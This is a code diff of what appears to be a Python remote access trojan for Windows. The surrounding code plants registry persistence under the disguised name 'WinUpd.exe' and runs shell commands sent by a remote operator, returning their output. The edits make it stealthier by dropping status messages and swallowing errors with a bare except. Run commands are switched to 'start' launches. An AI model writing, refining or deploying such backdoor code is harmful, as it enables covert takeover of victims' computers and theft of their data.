@@ -43,12 +43,8 @@ def del_persistence(conn):
         winreg.CloseKey(key)
         target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
         os.remove(target)
-        print("[+] Destroyed Persistence")
         send_data(conn , b'completed')
-    except FileNotFoundError:
-        print("[-] Registry not found.")
-    except Exception as e:
-        print(f"[-] Error: {e}")
+    except:pass
 
 def add_persistence(conn):
     try:
@@ -79,7 +75,7 @@ def handle_shell(conn):
                 break
             elif data.startswith("cd "):
                 os.chdir(data[3:])
-                send_data(os.getcwd())
+                send_data(conn, os.getcwd().encode())
             else:
                 proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout_value, stderr_value = proc.communicate()
@@ -138,7 +134,7 @@ def run(filename):
     program_path = os.path.join(base_path, filename)
     if os.path.exists(program_path):
         try:
-            subprocess.run(program_path)
+            os.system(f"start {program_path}")
         except:
             pass
 def main():
